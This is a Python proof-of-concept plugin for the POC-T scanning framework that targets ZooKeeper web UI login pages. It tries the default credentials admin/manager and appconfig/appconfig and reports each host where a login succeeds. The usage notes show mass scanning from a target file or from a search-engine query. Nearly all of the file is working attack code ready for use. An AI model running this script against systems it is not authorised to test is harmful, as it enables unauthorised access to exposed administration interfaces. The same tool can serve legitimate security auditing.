#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = unc1e

"""

Zoomkeeper web ui 默认密码poc
***
    Please login using admin/manager or appconfig/appconfig.
***



# zoomkeeper_ui_weakpass.py
Usage
  python POC-T.py -s zoomkeeper_ui_weakpass -iF target.txt
   python2 POC-T.py -s zoomkeeper_ui_weakpass -aF "title=\"ZK UI\""
   
   

"""

import requests


def poc(target):
    # modify url
    base_url = target if "://" in target else 'http://' + target
    url = base_url + "/login" if "login" not in base_url else base_url
    
    # declare consts
    payload_appconfig = {
    'username': 'appconfig',
    'password': 'appconfig',
    'action': 'Sign In',
    }
    payload_admin = {
    'username': 'admin',
    'password': 'manager',
    'action': 'Sign In',
    } 
    headers = {
    'upgrade-insecure-requests': "1",
    'dnt': "1",
    'content-type': "application/x-www-form-urlencoded",
    'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
    'accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    }
    
    try:
        # try logining with admin
        sess_adm = requests.Session()
        sess_adm.get(url=url, timeout=5)
        adm = sess_adm.post(url=url, data=payload_admin, headers=headers, timeout=5)
        # succeed in login
        if 'Hosts' in adm.text and 'admin' in adm.text:
            #  adm stand for admin weakpass
            return "[adm]"+base_url 
            
        # if first login failed
        elif 'Invalid Login' in adm.text :
            # try logining with appconfig    
            sess_cfg = requests.Session()
            sess_cfg.get(url=url, timeout=5)
            cfg = sess_cfg.post(url=url, data=payload_appconfig, timeout=5)
            # second trial, if succeed
            if 'Hosts' in cfg.text and 'appconfig' in cfg.text:
                return "[cfg]"+base_url
                #  cfg stand for appconfig weakpass
                
            # Failed again, proving to be no vulns
            elif 'Invalid Login' in cfg.text :
                return False
    # catch
    except Exception:
        pass
    # Failed logining twice, proving to be no vulns     
    return False


